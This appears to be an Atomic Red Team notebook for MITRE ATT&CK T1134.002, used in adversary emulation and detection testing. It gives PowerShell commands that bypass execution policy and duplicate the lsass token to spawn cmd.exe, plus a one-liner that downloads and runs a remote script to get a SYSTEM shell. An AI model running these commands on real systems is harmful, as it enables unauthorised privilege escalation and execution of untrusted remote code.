{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "d3a6932c",
   "metadata": {},
   "source": "# T1134.002 - Create Process with Token\nAdversaries may create a new process with a different token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)\n\nCreating processes with a different token may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used (ex: gathered via other means such as [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003))."
  },
  {
   "cell_type": "markdown",
   "id": "1a70a786",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "5aea7478",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Access Token Manipulation",
    "This Action demonstrates how an access token for a specific program can spawn another program under a different owner. \nAdversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. \nThis Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-ExecutionPolicy -Scope Process Bypass -Force\n$owners = @{}\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}\nGet-Process | Select ProcessName,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}}\n$PathToAtomicsFolder\\T1134.002\\src\\GetToken.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\"cmd.exe\")\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6d217839",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.002 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "2da607c3",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique",
    "Get SYSTEM shell - Pop System Shell using Token Manipulation technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1f449617",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1134.002 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "8de9408d",
   "metadata": {},
   "source": "## Detection\nIf an adversary is using a standard command-line shell (i.e. [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003)), analysts may detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command or similar artifacts. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts may detect token manipulation only through careful analysis of user activity, examination of running processes, and correlation with other endpoint and network behavior.\n\nAnalysts can also monitor for use of Windows APIs such as <code>CreateProcessWithTokenW</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}